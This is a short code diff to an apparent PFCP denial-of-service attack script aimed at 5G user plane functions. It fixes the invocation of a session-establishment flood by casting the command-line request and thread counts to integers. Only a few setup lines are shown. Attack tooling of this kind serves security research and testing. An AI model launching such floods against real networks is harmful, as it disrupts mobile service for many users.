@@ -399,4 +399,4 @@ class PFCPDosAttack:
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
 objet_dos.set_randomize(True)
-objet_dos.Start_pfcp_session_establishment_flood(reqNbr=sys.argv[1], num_threads=sys.argv[2])
+objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
